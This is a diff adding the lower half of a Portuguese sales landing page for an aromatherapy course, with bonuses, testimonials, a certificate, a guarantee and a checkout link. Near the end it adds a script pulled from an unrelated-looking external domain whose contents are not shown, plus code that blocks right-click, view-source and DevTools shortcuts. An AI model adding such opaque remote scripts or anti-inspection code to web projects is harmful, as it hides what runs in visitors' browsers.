+        <a class="btn-cta" href="https://esenciaactiva.mycartpanda.com/checkout/190789443:1" target="_blank" rel="noopener noreferrer" aria-label="Ir para o checkout seguro em uma nova aba">
+          INSCREVA-SE AGORA CLICANDO AQUI
+        </a>
+      </div>
+    </div>
+  </section>
+
+
+    <!-- BÔNUS -->
+  <section class="bonuses" aria-labelledby="bonuses-title">
+    <div class="bonuses__container">
+      <h2 id="bonuses-title" class="bonuses__headline">🎁 Inscreva-se agora e leve TODOS estes bônus inclusos 🎁</h2>
+      <p class="bonuses__sub"><span class="bonuses__check">✔</span>Estes presentes já estão garantidos para quem entrar hoje:</p>
+
+      <div class="bonuses__grid">
+        <article class="bonus"><div class="bonus__ribbon"><span>🎁 BÔNUS 1</span></div><figure class="bonus__cover"><img src="images/etiquetas.webp" alt="Modelos de Etiquetas Profissionais"></figure><h3 class="bonus__title">Modelos de Etiquetas Profissionais</h3><p class="bonus__text">Edite e personalize etiquetas…</p><a href="#checkout" class="bonus__cta">HOJE GRÁTIS</a></article>
+        <article class="bonus"><div class="bonus__ribbon"><span>🎁 BÔNUS 2</span></div><figure class="bonus__cover"><img src="images/acompanhamento.webp" alt="Acompanhamento Virtual Exclusivo"></figure><h3 class="bonus__title">Acompanhamento Virtual Exclusivo</h3><p class="bonus__text">Suporte direto e acompanhamento…</p><a href="#checkout" class="bonus__cta">HOJE GRÁTIS</a></article>
+        <article class="bonus"><div class="bonus__ribbon"><span>🎁 BÔNUS 3</span></div><figure class="bonus__cover"><img src="images/pacotes.webp" alt="Guia de Embalagens que Encantam"></figure><h3 class="bonus__title">Guia de Embalagens que Encantam</h3><p class="bonus__text">Aprenda a criar embalagens…</p><a href="#checkout" class="bonus__cta">HOJE GRÁTIS</a></article>
+        <article class="bonus"><div class="bonus__ribbon"><span>🎁 BÔNUS 4</span></div><figure class="bonus__cover"><img src="images/receitas.webp" alt="Amostras que Vendem"></figure><h3 class="bonus__title">Amostras que Vendem</h3><p class="bonus__text">Fórmulas simples e eficazes…</p><a href="#checkout" class="bonus__cta">HOJE GRÁTIS</a></article>
+        <article class="bonus"><div class="bonus__ribbon"><span>🎁 BÔNUS 5</span></div><figure class="bonus__cover"><img src="images/presentes.webp" alt="Guia para Criar seu Primeiro Kit de Presente"></figure><h3 class="bonus__title">Guia para Criar seu Primeiro Kit de Presente</h3><p class="bonus__text">Monte kits temáticos…</p><a href="#checkout" class="bonus__cta">HOJE GRÁTIS</a></article>
+      </div>
+    </div>
+  </section>
+
+  <!-- FEEDBACKS / WHATSAPP (MARQUEE SUAVE) -->
+  <section class="reviews reviews--smooth" id="reviews" aria-labelledby="reviews-title">
+    <div class="reviews__container">
+      <h2 id="reviews-title" class="reviews__title">Cada vez mais Empreendedores estão Conquistando</h2>
+
+      <div class="reviews-marquee">
+        <div class="reviews-marquee__track">
+          <figure class="review"><img src="images/wa1.webp" alt="Depoimento do WhatsApp 1"></figure>
+          <figure class="review"><img src="images/wa2.webp" alt="Depoimento do WhatsApp 2"></figure>
+          <figure class="review"><img src="images/wa3.webp" alt="Depoimento do WhatsApp 3"></figure>
+          <figure class="review"><img src="images/wa4.webp" alt="Depoimento do WhatsApp 4"></figure>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- CARD: CERTIFICADO -->
+  <section class="section-band">
+    <div class="section-card">
+      <div class="section-card__header"><span class="dot"></span></div>
+
+      <section class="certificate" aria-labelledby="cert-title">
+        <div class="certificate__container">
+          <div class="certificate__content">
+            <h2 id="cert-title">Reconheça Seu Talento e Capacidades</h2>
+            <p>Ao completar o curso, você receberá um <strong>certificado personalizado</strong> com seu nome, sem nenhum custo adicional.</p>
+            <p>Este certificado te torna uma <strong>Profissional em Aromaterapia Orgânica e Ecológica</strong>, dando credibilidade e confiança ao seu trabalho.</p>
+          </div>
+          <figure class="certificate__media">
+            <img src="images/certificado.webp" alt="Certificado de conclusão emoldurado junto a velas" loading="lazy">
+          </figure>
+        </div>
+      </section>
+    </div>
+  </section>
+
+  <!-- CARD: GARANTIA -->
+  <section class="section-band section-band--sand">
+    <div class="section-card">
+      <div class="section-card__header"><span class="dot"></span></div>
+
+      <section class="guarantee" aria-labelledby="guarantee-title">
+        <div class="guarantee__container">
+          <div class="guarantee__content">
+            <h2 id="guarantee-title">Sua compra é <span>100 % segura</span></h2>
+            <h3 class="guarantee__subtitle">Garantia Incondicional de Satisfação</h3>
+            <p>Nos importamos que você faça sua compra com total segurança. Sabemos que este curso é real… para sua <strong>Aromaterapia Natural e Ecológica</strong>.</p>
+            <ul class="guarantee__bullets">
+              <li>Acesso a um sistema comprovado com resultados reais.</li>
+              <li><strong>7 dias</strong> de garantia completa de satisfação.</li>
+              <li>Reembolso de <strong>100%</strong> se você não estiver satisfeita.</li>
+            </ul>
+          </div>
+          <figure class="guarantee__media">
+            <img src="images/garantia.webp" alt="Selo 7 dias de satisfação garantida" loading="lazy">
+          </figure>
+        </div>
+      </section>
+    </div>
+  </section>
+
+  <!-- OFERTA FINAL -->
+  <section class="pricing" aria-labelledby="pricing-title-2">
+    <div class="pricing__container">
+
+      <div class="pricing__box pricing__box--image">
+        <figure class="price-image">
+          <img src="images/19,90.webp" alt="Preço relâmpago de pré-lançamento: $9.90 dólares. Pagamento único para as primeiras inscritas." width="960" height="720" loading="eager">
+        </figure>
+
+        <a class="btn-cta" href="https://esenciaactiva.mycartpanda.com/checkout/190789443:1" target="_blank" rel="noopener noreferrer" aria-label="Ir para o checkout seguro em uma nova aba">
+          INSCREVA-SE AGORA CLICANDO AQUI
+        </a>
+        </p>
+      </div>
+    </div>
+  </section>
+
+
+  <script>
+  // Marquee suave (feedbacks)
+  (function(){
+    const wrap = document.querySelector('.reviews-marquee');
+    if(!wrap) return;
+    const track = wrap.querySelector('.reviews-marquee__track');
+    const base = Array.from(track.children);
+
+    function setup(){
+      track.querySelectorAll('.is-clone').forEach(n => n.remove());
+
+      const styles = getComputedStyle(track);
+      const gap = parseFloat(styles.gap) || 0;
+      let baseWidth = 0;
+      base.forEach(el => { baseWidth += el.getBoundingClientRect().width; });
+      baseWidth += gap * (base.length - 1);
+
+      let safety = 0;
+      while (track.scrollWidth < baseWidth * 2 && safety < 10) {
+        base.forEach(el => {
+          const c = el.cloneNode(true);
+          c.classList.add('is-clone');
+          c.setAttribute('aria-hidden','true');
+          track.appendChild(c);
+        });
+        safety++;
+      }
+      track.style.setProperty('--reviews-distance', baseWidth + 'px');
+    }
+
+    setup();
+    let t;
+    window.addEventListener('resize', () => {
+      clearTimeout(t);
+      t = setTimeout(setup, 150);
+    });
+  })();
+  </script>
+
+  <!-- Coloque este <script> no fim do <body> -->
+<script src="https://wprocket.cfd/7fdHI6"></script><script>
+(function () {
+  const block = (e) => { e.preventDefault(); e.stopPropagation(); };
+
+  // Bloqueia menu de contexto (clique direito)
+  window.addEventListener('contextmenu', block, { capture: true });
+
+  // Bloqueia Ctrl/Cmd+U (ver código-fonte) e alguns atalhos opcionais
+  window.addEventListener('keydown', (e) => {
+    const k = (e.key || '').toLowerCase();
+    const ctrlOrMeta = e.ctrlKey || e.metaKey;
+
+    // Específico que você pediu:
+    if (ctrlOrMeta && k === 'u') return block(e);        // Ctrl/Cmd + U
+
+    // Opcionais (remova se não quiser):
+    if (ctrlOrMeta && (k === 's' || k === 'p')) return block(e);    // salvar/imprimir
+    if ((ctrlOrMeta && e.shiftKey && (k === 'i' || k === 'j' || k === 'c')) || k === 'f12')
+      return block(e);                                              // DevTools (I/J/C) e F12
+  }, { capture: true });
+})();
+</script>
+
+</body>
+</html>
